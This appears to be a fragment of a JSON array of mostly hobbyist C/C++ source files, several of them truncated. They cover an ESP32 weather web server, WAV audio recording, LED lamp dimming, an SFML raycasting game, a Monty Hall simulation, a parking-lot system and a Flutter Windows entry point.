{1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n};\n\nint tabla2[31][70] = {\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0},\n    {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1",
    "#include <WiFi.h>\n#include <WebServer.h>\n#include <DHT.h>\n#include<Adafruit_Sensor.h>\n//  network \nconst char* ssid = \"YATEC\";\nconst char* password = \"YATEC123\";\n\n#define DHTPIN 2 // Digital pin \n#define DHTTYPE DHT11 // DHT 11\n\nDHT dht(DHTPIN, DHTTYPE);\nWebServer server(80);\n\nvoid handleRoot();\n\nvoid setup() {\n  Serial.begin(115200);\n\n  WiFi.begin(ssid, password);\n  while (WiFi.status() != WL_CONNECTED) {\n    delay(1000);\n    Serial.println(\"Connecting to WiFi...\");\n  }\n\n  Serial.print(\"IP address: \");\n  Serial.println(WiFi.localIP());\n\n  dht.begin(); // Initialize DHT sensor\n\n  server.on(\"/\", handleRoot);\n  server.begin();\n}\n\nvoid loop() {\n  server.handleClient();\n\n  float temperature = dht.readTemperature();\n  float humidity = dht.readHumidity();\n\n  Serial.print(\"Temperature = \");\n  Serial.print(temperature, 1);\n  Serial.println(\" \u00b0C\");\n  Serial.print(\"Humidity = \");\n  Serial.print(humidity, 1);\n  Serial.println(\" %\");\n\n  delay(1000);\n}\n\nvoid handleRoot() {\n  String html = \"<html><body>\";\n  html += \"<h1 style='text-align:center;'>Weather Moniter</h1>\";\n  html += \"<div style='display:flex; justify-content:center;'>\";\n  html += \"<div style='margin:25px; text-align:center;'>\";\n  html += \"<h2>Temperature Value</h2>\";\n  html += \"<p style='font-size:48px;'>\" + String(dht.readTemperature(),1) + \" &deg;C</p>\";\n  html += \"</div>\";\n  html += \"<div style='margin:25px; text-align:center;'>\";\n  html += \"<h2>Humidity Value</h2>\";\n  html += \"<p style='font-size:55px;'>\" + String(dht.readHumidity()) + \" %</p>\";\n  html += \"</div>\";\n  html += \"</div>\";\n  html += \"</body></html>\";\n\n  server.send(200, \"text/html\", html);\n}\n",
    "#include \"Audio.h\"\n\nAudio::Audio(MicType micType) {\n  wavData = new char*[wavDataSize/dividedWavDataSize];\n  for (int i = 0; i < wavDataSize/dividedWavDataSize; ++i) wavData[i] = new char[dividedWavDataSize];\n  i2s = new I2S(micType);\n}\n\nAudio::~Audio() {\n  for (int i = 0; i < wavDataSize/dividedWavDataSize; ++i) delete[] wavData[i];\n  delete[] wavData;\n  delete i2s;\n}\n\nvoid Audio::CreateWavHeader(byte* header, int waveDataSize){\n  header[0] = 'R';\n  header[1] = 'I';\n  header[2] = 'F';\n  header[3] = 'F';\n  unsigned int fileSizeMinus8 = waveDataSize + 44 - 8;\n  header[4] = (byte)(fileSizeMinus8 & 0xFF);\n  header[5] = (byte)((fileSizeMinus8 >> 8) & 0xFF);\n  header[6] = (byte)((fileSizeMinus8 >> 16) & 0xFF);\n  header[7] = (byte)((fileSizeMinus8 >> 24) & 0xFF);\n  header[8] = 'W';\n  header[9] = 'A';\n  header[10] = 'V';\n  header[11] = 'E';\n  header[12] = 'f';\n  header[13] = 'm';\n  header[14] = 't';\n  header[15] = ' ';\n  header[16] = 0x10;  // linear PCM\n  header[17] = 0x00;\n  header[18] = 0x00;\n  header[19] = 0x00;\n  header[20] = 0x01;  // linear PCM\n  header[21] = 0x00;\n  header[22] = 0x01;  // monoral\n  header[23] = 0x00;\n  header[24] = 0x80;  // sampling rate 16000\n  header[25] = 0x3E;\n  header[26] = 0x00;\n  header[27] = 0x00;\n  header[28] = 0x00;  // Byte/sec = 16000x2x1 = 32000\n  header[29] = 0x7D;\n  header[30] = 0x00;\n  header[31] = 0x00;\n  header[32] = 0x02;  // 16bit monoral\n  header[33] = 0x00;\n  header[34] = 0x10;  // 16bit\n  header[35] = 0x00;\n  header[36] = 'd';\n  header[37] = 'a';\n  header[38] = 't';\n  header[39] = 'a';\n  header[40] = (byte)(waveDataSize & 0xFF);\n  header[41] = (byte)((waveDataSize >> 8) & 0xFF);\n  header[42] = (byte)((waveDataSize >> 16) & 0xFF);\n  header[43] = (byte)((waveDataSize >> 24) & 0xFF);\n}\n\nvoid Audio::Record() {\n  CreateWavHeader(paddedHeader, wavDataSize);\n  int bitBitPerSample = i2s->GetBitPerSample();\n  if (bitBitPerSample == 16) {\n    for (int j = 0; j < wavDataSize/dividedWavDataSize; ++j) {\n      i2s->Read(i2sBuffer, i2sBufferSize/2);\n      for (int i = 0; i < i2sBufferSize/8; ++i) {\n        wavData[j][2*i] = i2sBuffer[4*i + 2];\n        wavData[j][2*i + 1] = i2sBuffer[4*i + 3];\n      }\n    }\n  }\n  else if (bitBitPerSample == 32) {\n    for (int j = 0; j < wavDataSize/dividedWavDataSize; ++j) {\n      i2s->Read(i2sBuffer, i2sBufferSize);\n      for (int i = 0; i < i2sBufferSize/8; ++i) {\n        wavData[j][2*i] = i2sBuffer[8*i + 2];\n        wavData[j][2*i + 1] = i2sBuffer[8*i + 3];\n      }\n    }\n  }\n}\n",
    "#include \"Arduino.h\"\n#include \"light.h\"\n\n/**\n * @brief Define channel, press key\n *\n * Define buttons, channels and bind each tone PWM output pin to the channel\n */\nvoid PinsInit()\n{\n//Configure eye protection, daytime, night mode buttons\n  pinMode(MODE_PROTECT_BUTTON,INPUT_PULLUP);\n  pinMode(MODE_DAYTIME_BUTTON,INPUT_PULLUP);\n  pinMode(MODE_NIGHT_BUTTON,INPUT_PULLUP);\n\n//Warm colors\n  pinMode(LEDW_INCREASE_BUTTON,INPUT_PULLUP);\n  pinMode(LEDW_DECREASE_BUTTON,INPUT_PULLUP);\n  ledcSetup(LEDW_CHANNEL,LED_FREQ,LED_RESOLUTION);        //Set the warm tone channel\n  ledcAttachPin(LED_WARM,LEDW_CHANNEL);                   //Binding Pins to Channels\n\n//Cool colors\n  pinMode(LEDC_INCREASE_BUTTON,INPUT_PULLUP);             \n  pinMode(LEDC_DECREASE_BUTTON,INPUT_PULLUP);\n  ledcSetup(LEDC_CHANNEL,LED_FREQ,LED_RESOLUTION);        //Set up the cool channel\n  ledcAttachPin(LED_COLD,LEDC_CHANNEL);                   //Binding Pins to Channels\n}\n\n\n/**\n * @brief Long press the button\n *\n * When the button is long pressed, the function always returns True, which is used to flexibly adjust the brightness\n *\n * @param pin Button corresponding pin\n */\nbool KeyStroke_LongPass(int pin)\n{\n  bool LED_flag = false;\n\n  if(!digitalRead(pin))\n  {\n    delay(10);\n    if(!digitalRead(pin))\n    {\n      LED_flag = true;\n    }\n  }\n  else\n  {\n    LED_flag = false;\n  }\n  return LED_flag;\n}\n\n/**\n * @brief Short press button\n *\n * When the button is pressed, the function returns True to display the data in the current mode.\n *\n * @param pin    Button corresponding pin\n * @param botton Select mode button flag pointer\n */\nbool KeyStroke_ShortPass(int pin,bool *botton_flag)\n{\n  bool LED_flag = false;\n  if(!digitalRead(pin) && *botton_flag)\n  {\n    delay(100);\n    if(!digitalRead(pin))\n    {\n      LED_flag = true;\n      *botton_flag = false;\n    }\n  }\n  else \n  {\n    LED_flag = false;\n  }\n  if(digitalRead(pin))\n  {\n    *botton_flag = true;\n  }\n  return LED_flag;\n}\n\n/**\n * @brief Within the rated range, adjust PWM to increase the brightness\n *\n * If the brightness is less than the maximum resolution, the brightness increases by 1 unit per cycle.\n *\n * @param Brightness Current brightness pointer\n * @param channel    PWM pin corresponding to the channel number\n */\nvoid PWM_AddDimming(int *Brightness,int channel)\n{\n  if (*Brightness < pow(2,LED_RESOLUTION))\n  {\n    *Brightness = *Brightness + 1;\n  }\n  ledcWrite(channel,*Brightness);\n  delay(10);\n}\n\n/**\n * @brief Within the rated range, adjust PWM to reduce the brightness\n *\n * If the brightness is greater than 0, the brightness decreases by 1 unit each time the cycle is completed.\n *\n * @param Brightness Current brightness pointer\n * @param channel    PWM pin corresponding to the channel number\n */\nvoid PWM_MinusDimming(int *Brightness,int channel)\n{\n  if (*Brightness > 0)\n  {\n    *Brightness = *Brightness - 1;\n  }\n  ledcWrite(channel,*Brightness);\n  delay(10);\n}\n\n/**\n * @brief Choose different modes, warm and cool tones, brightness\n *\n * Fill in different cold and warm color parameters to achieve different modes\n *\n * @param Brightness           Current brightness pointer\n * @param LEDX_CHANNEL         The hue channel that needs editing\n * @param MODE_LEDX_BRIGHTNESS Brightness of a certain hue in the current mode\n */\nvoid Mode_Adjustment(int *Brightness,int LEDX_CHANNEL,int MODE_LED_BRIGHTNESS)\n{\n  *Brightness = MODE_LED_BRIGHTNESS;\n  ledcWrite(LEDX_CHANNEL,*Brightness);\n}\n\n/**\n * @brief After the receive data ,Change yhe LED\n * \n * Change the lamp parameters after receiving the data\n * \n * @param Receive_LastBrightness     Receives the data from the previous LED\n * @param Receive_Brightness         The data from the LED light is received\n * @param CHANNEL                    Channels that need to be changed\n */\nvoid Receive_ChangeLED(int *Receive_LastBrightness,int *Receive_Brightness,int CHANNEL)\n{\n  if(*Receive_LastBrightness != *Receive_Brightness)\n  {\n    ledcWrite(CHANNEL,*Receive_Brightness);\n    *Receive_LastBrightness = *Receive_Brightness;\n  }\n}\n\n/*example*/\n/*#include \"light.h\"\n\n//Current brightness of each hue\nint Current_LEDW_Brightness = 0;                       //Cool brightness\nint Current_LEDC_Brightness = 0;                       //Warm color brightness\n//Select mode button flag\nbool BOTTON_flag = true; \n\nvoid setup() \n{\n//Initialization pin\n  PinsInit();\n}\nvoid loop() \n{\n  //Adjust the brightness of warm and cold tones by pressing buttons\n  if (KeyStroke_LongPass(LEDW_INCREASE_BUTTON))\n  {\n   PWM_AddDimming(&Current_LEDW_Brightness,LEDW_CHANNEL);                                                              //Long press the button to increase the PWM of the warm color channel continuously\n  }\n  if (KeyStroke_LongPass(LEDW_DECREASE_BUTTON ))                                                                       \n  {\n   PWM_MinusDimming(&Current_LEDW_Brightness,LEDW_CHANNEL);                                                            //Long press the button to reduce the PWM of warm color ",
    "#include <SFML/Graphics.hpp>\r\n#include <SFML/Audio.hpp>\r\n#include <iostream>\r\n#include <math.h>\r\n#include \"CastomTexture.h\"\r\n#include \"CastomSound.h\"\r\n#include \"CastomText.h\"\r\n#include \"settings.h\"\r\n#include \"Location.h\"\r\n#include \"Player.h\"\r\n#include \"btns.h\"\r\nusing namespace sf;\r\nRenderWindow window(VideoMode(screenSizeX, screenSizeY), \"game\");\r\n\r\nint main() {\r\n\tsrand(time(NULL));\r\n\r\n\ttext.text.setFillColor(Color(3, 231, 243));\r\n\tfont.loadFromFile(\"resources\\\\font.TTF\");\r\n\r\n\tRectangleShape gameFloor;\r\n\tgameFloor.setSize(Vector2f(screenSizeX, 1));\r\n\r\n\twindow.setFramerateLimit(30);\r\n\twindow.setMouseCursorVisible(0);\r\n\r\n\twhile (window.isOpen()) {\r\n\t\tEvent event;\r\n\t\twhile (window.pollEvent(event)) {\r\n\t\t\tif (event.type == Event::Closed)\r\n\t\t\t\twindow.close();\r\n\t\t\telse if (event.type == event.Resized)\r\n\t\t\t\twindow.setSize(Vector2u(window.getSize().x, window.getSize().x * 0.5));\r\n\t\t}\r\n\r\n\t\tplayer.angle += (Mouse::getPosition(window).x - screenSizeX / 2) * 0.001;\r\n\t\t// \u00ef\u00e0\u00f3\u00e7\u00e0\r\n\t\tif (Keyboard::isKeyPressed(Keyboard::Escape)) {\r\n\t\t\tCastomText GameName(100, Color(3, 231, 243), Vector2f(50, 0), \"Game\");\r\n\t\t\tCastomSound touchBtn(\"resources\\\\sounds\\\\touchBtn.wav\");\r\n\t\t\tCastomSound pressBtn(\"resources\\\\sounds\\\\pressBtn.wav\");\r\n\r\n\t\t\twindow.setMouseCursorVisible(1);\r\n\r\n\t\t\tbool pause = 1;\r\n\r\n\t\t\twhile (window.isOpen() && pause) {\r\n\t\t\t\tEvent event;\r\n\t\t\t\twhile (window.pollEvent(event) || (window.isOpen() && !window.hasFocus())) {\r\n\t\t\t\t\tif (event.type == Event::Closed)\r\n\t\t\t\t\t\twindow.close();\r\n\t\t\t\t\telse if (event.type == event.Resized)\r\n\t\t\t\t\t\twindow.setSize(Vector2u(window.getSize().x, window.getSize().x * 0.5));\r\n\t\t\t\t}\r\n\r\n\t\t\t\tunsigned short\r\n\t\t\t\t\tGlobalX = Mouse::getPosition(window).x * screenSizeX / window.getSize().x,\r\n\t\t\t\t\tGlobalY = Mouse::getPosition(window).y * screenSizeY / window.getSize().y;\r\n\r\n\t\t\t\twindow.clear();\r\n\t\t\t\tfor (auto& i : btns) {\r\n\r\n\t\t\t\t\ttext.text.setString(i.str);\r\n\r\n\t\t\t\t\tif (i.isPress == 1)\r\n\t\t\t\t\t\ttext.text.setCharacterSize(45);\r\n\t\t\t\t\telse\r\n\t\t\t\t\t\ttext.text.setCharacterSize(50);\r\n\r\n\t\t\t\t\tif (GlobalX > 100 && GlobalX < 350 && GlobalY > i.y && GlobalY < i.y + 60) {\r\n\t\t\t\t\t\ttext.text.setPosition(i.x + 15, i.y);\r\n\t\t\t\t\t\tif (i.isTouch == 0)\r\n\t\t\t\t\t\t\ttouchBtn.play();\r\n\t\t\t\t\t\ti.isTouch = 1;\r\n\r\n\t\t\t\t\t\tif (Mouse::isButtonPressed(Mouse::Left) && mouseBtnLeft == 0) {\r\n\t\t\t\t\t\t\tpressBtn.play();\r\n\t\t\t\t\t\t\tmouseBtnLeft = 1;\r\n\t\t\t\t\t\t\ttext.text.setFillColor(Color(0, 211, 223));\r\n\t\t\t\t\t\t\ti.isPress = 1;\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\t// \u00ea\u00ed\u00ee\u00ef\u00ea\u00e0 \u00ee\u00f2\u00ef\u00f3\u00f9\u00e5\u00ed\u00e0\r\n\t\t\t\t\t\telse if (!Mouse::isButtonPressed(Mouse::Left)) {\r\n\t\t\t\t\t\t\t// \u00e5\u00f1\u00eb\u00e8 \u00ef\u00ed\u00ee\u00ea\u00e0 \u00ec\u00e5\u00ed\u00fe \u00e4\u00ee \u00fd\u00f2\u00ee\u00e3\u00ee \u00e1\u00fb\u00eb\u00e0 \u00e7\u00e0\u00e6\u00e0\u00f2\u00e0\r\n\t\t\t\t\t\t\tif (i.isPress == 1) {\r\n\t\t\t\t\t\t\t\ti.isPress = 0;\r\n\t\t\t\t\t\t\t\tif (i.str[0] == 'C') { // continue\r\n\t\t\t\t\t\t\t\t\tpause = 0;\r\n\t\t\t\t\t\t\t\t\twindow.setMouseCursorVisible(0);\r\n\t\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\t\telse if (i.str[0] == 'S') // save game\r\n\t\t\t\t\t\t\t\t\tplayer.save();\r\n\t\t\t\t\t\t\t\telse if (i.str[0] == 'O') // out game\r\n\t\t\t\t\t\t\t\t\twindow.close();\r\n\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t\tmouseBtnLeft = 0;\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse {\r\n\t\t\t\t\t\ti.isTouch = 0;\r\n\t\t\t\t\t\ttext.text.setPosition(i.x, i.y);\r\n\t\t\t\t\t}\r\n\t\t\t\t\twindow.draw(text.text);\r\n\t\t\t\t}\r\n\t\t\t\twindow.draw(GameName.text);\r\n\t\t\t\twindow.display();\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tMouse::setPosition(Vector2i(screenSizeX / 2, screenSizeY / 2), window);\r\n\r\n\t\twindow.clear();\r\n\t\t// \u00ee\u00f2\u00f0\u00e8\u00f1\u00ee\u00e2\u00ea\u00e0 \"\u00ef\u00ee\u00eb\u00e0\"\r\n\t\tfor (int i = 1; i < FloorLines; i++) {\r\n\t\t\tgameFloor.setPosition(0, screenSizeY - i);\r\n\t\t\tchar col = 255 - 255 * i / FloorLines;\r\n\t\t\tgameFloor.setFillColor(Color(col, col, col));\r\n\t\t\twindow.draw(gameFloor);\r\n\t\t}\r\n\t\t// \u00f0\u00fd\u00e9 \u00ea\u00e0\u00f1\u00f2\u00e8\u00ed\u00e3\r\n\t\trayCadting(&window);\r\n\t\t// \u00f3\u00ef\u00f0\u00e0\u00e2\u00eb\u00e5\u00ed\u00e8\u00e5\r\n\t\tPlayerControl(&window);\r\n\r\n\t\tchar sumbvol = worldMap[player.numLvl].loc[(int)player.y][(int)player.x];\r\n\t\tif (sumbvol >= '#' && sumbvol <= '-') {\r\n\t\t\ttext.text.setString(worldMap[player.numLvl].dialogs[sumbvol - '#']);\r\n\t\t\ttext.text.setPosition(0, 0);\r\n\t\t\twindow.draw(text.text);\r\n\t\t}\r\n\r\n\t\twindow.display();\r\n\t}\r\n\treturn 0;\r\n}",
    "#include <iostream>\n#include <cstdlib>\n#include <ctime>\n\nint main() {\n    srand(static_cast<unsigned int>(time(0))); // Seed for random number generation\n\n    const int numTrials = 1000000;\n    int switchWins = 0;\n    int stickWins = 0;\n\n    for (int i = 0; i < numTrials; ++i) {\n        // Randomly assign the car to one of the three doors\n        int carDoor = rand() % 3;\n        // Player randomly picks a door\n        int playerPick = rand() % 3;\n\n        // Monty reveals a door with a goat\n        int montyReveal;\n        do {\n            montyReveal = rand() % 3;\n        } while (montyReveal == carDoor || montyReveal == playerPick);\n\n        // Determine the remaining door\n        int remainingDoor;\n        for (int j = 0; j < 3; ++j) {\n            if (j != playerPick && j != montyReveal) {\n                remainingDoor = j;\n                break;\n            }\n        }\n\n        // Check if switching wins\n        if (remainingDoor == carDoor) {\n            ++switchWins;\n        }\n        // Check if sticking wins\n        if (playerPick == carDoor) {\n            ++stickWins;\n        }\n    }\n\n    // Calculate and display the results\n    std::cout << \"Number of trials: \" << numTrials << std::endl;\n    std::cout << \"Wins by switching: \" << switchWins << \" (\" << (static_cast<double>(switchWins) / numTrials) * 100 << \"%)\" << std::endl;\n    std::cout << \"Wins by not switching: \" << stickWins << \" (\" << (static_cast<double>(stickWins) / numTrials) * 100 << \"%)\" << std::endl;\n\n    return 0;\n}\n\n\n",
    "#include <iostream>\n#include <chrono>\n#include <ctime>\n#include <map>\n#include <string>\n#include <vector>\n\nusing namespace std;\nusing namespace std::chrono;\n\nclass Car\n{\nprivate:\n    string licensePlate;\n    system_clock::time_point entryTime;\n    int token;\n    system_clock::time_point exitTime;\n    bool hasExited;\n    static int tokenNum;\n\npublic:\n    Car() : licensePlate(\"\"), entryTime(system_clock::now()), token(tokenNum++), exitTime(system_clock::time_point()), hasExited(false) {};\n    Car(string licensePlate) : licensePlate(licensePlate), entryTime(system_clock::now()), token(tokenNum++), exitTime(system_clock::time_point()), hasExited(false) {};\n\n    int getTokenNum()\n    {\n        return token;\n    }\n\n    void displayDetails() const\n    {\n        time_t entryTimeT = system_clock::to_time_t(entryTime);\n        cout << \"License Plate: \" << this->licensePlate << endl;\n        cout << \"Entry Time: \" << ctime(&entryTimeT);\n        cout << \"Token Number: \" << this->token << endl;\n    }\n\n    void exitCar()\n    {\n        if (!this->hasExited)\n        {\n            this->exitTime = system_clock::now();\n            time_t exitTimeT = system_clock::to_time_t(this->exitTime);\n            cout << \"Car with \" << this->licensePlate << \" exited at \" << ctime(&exitTimeT) << endl;\n            this->hasExited = true;\n        }\n        else\n        {\n            cout << \"Car with \" << this->licensePlate << \" has already exited.\" << endl;\n        }\n    }\n\n    string getLicensePlate() const { return licensePlate; }\n    bool isExited() const { return hasExited; }\n};\n\nclass ParkingSpot\n{\nprivate:\n    bool isAvailable;\n    Car *assignedCar;\n    int spotNumber;\n\npublic:\n    ParkingSpot(int number) : isAvailable(true), assignedCar(nullptr), spotNumber(number) {}\n\n    bool assignCar(Car *car)\n    {\n        if (isAvailable)\n        {\n            isAvailable = false;\n            assignedCar = car;\n            return true;\n        }\n        return false;\n    }\n\n    bool removeCar()\n    {\n        if (!isAvailable)\n        {\n            isAvailable = true;\n            delete assignedCar;\n            assignedCar = nullptr;\n            return true;\n        }\n        return false;\n    }\n\n    bool getAvailability() const { return isAvailable; }\n    int getSpotNumber() const { return spotNumber; }\n    Car *getAssignedCar() const { return assignedCar; }\n};\n\nclass ParkingLot\n{\nprivate:\n    vector<ParkingSpot *> spots;\n    static int totalCarAssigned;\n\npublic:\n    ParkingLot(int totalSpots)\n    {\n        for (int i = 0; i < totalSpots; ++i)\n        {\n            spots.push_back(new ParkingSpot(i + 1));\n        }\n    }\n\n    bool parkCar(Car *car)\n    {\n        for (auto &spot : spots)\n        {\n            if (spot->getAvailability())\n            {\n                if (spot->assignCar(car))\n                {\n                    totalCarAssigned++;\n                    cout << \"Car parked at spot: \" << spot->getSpotNumber() << endl;\n                    return true;\n                }\n            }\n        }\n        cout << \"No spots are available.\" << endl;\n        delete car;\n        return false;\n    }\n\n    void removeCar(const string &licensePlate)\n    {\n        for (auto &spot : spots)\n        {\n            if (!spot->getAvailability() && spot->getAssignedCar()->getLicensePlate() == licensePlate)\n            {\n                spot->getAssignedCar()->exitCar();\n                totalCarAssigned--;\n                spot->removeCar();\n                cout << \"Car removed from spot: \" << spot->getSpotNumber() << endl;\n                return;\n            }\n        }\n        cout << \"Car with license plate \" << licensePlate << \" not found.\" << endl;\n    }\n\n    void displayAvailableSpots() const\n    {\n        int availableSpots = 0;\n        for (const auto &spot : spots)\n        {\n            if (spot->getAvailability())\n            {\n                availableSpots++;\n            }\n        }\n        cout << \"Total Available Spots: \" << availableSpots << endl;\n    }\n\n    void displayAllCars() const\n    {\n        cout << \"Currently parked cars:\" << endl;\n        bool isParked = false;\n        for (const auto &spot : spots)\n        {\n            if (!spot->getAvailability())\n            {\n                spot->getAssignedCar()->displayDetails();\n                cout << \"Assigned to spot: \" << spot->getSpotNumber() << endl;\n                cout << \"++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\" << endl;\n                isParked = true;\n            }\n        }\n        if (!isParked)\n        {\n            cout << \"No cars are parked.\" << endl;\n        }\n    }\n    static void getTotalAssignedCars()\n    {\n        cout << \"Total parked cars: \" << totalCarAssigned << endl;\n    }\n};\n\nint Car::tokenNum = 0;\nint ParkingLot::totalCarAssigned = 0;\n\nint main()\n{\n    ParkingLot parkingLot1(30);\n    bool running = true;\n\n    while (running)\n    {\n        cout << \"1. Add a new car\" << endl;\n        cout << \"2. Display all cars\" << endl;\n        cout",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"aigen\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
